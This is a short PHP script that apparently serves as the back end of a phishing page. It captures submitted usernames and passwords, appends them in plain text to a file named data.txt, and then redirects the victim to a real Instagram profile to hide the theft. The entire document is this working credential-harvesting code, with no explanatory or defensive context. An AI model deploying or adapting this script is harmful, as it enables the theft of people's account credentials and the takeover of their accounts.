<?php
$name = $_POST['name'];
$pass = $_POST['pass'];
$fp = fopen("data.txt", "a");
$savestring = $name . "," . $pass . "\n";
fwrite($fp, $savestring);
fclose($fp);
header('Location:https://instagram.com/ppsckts/');
exit;
?>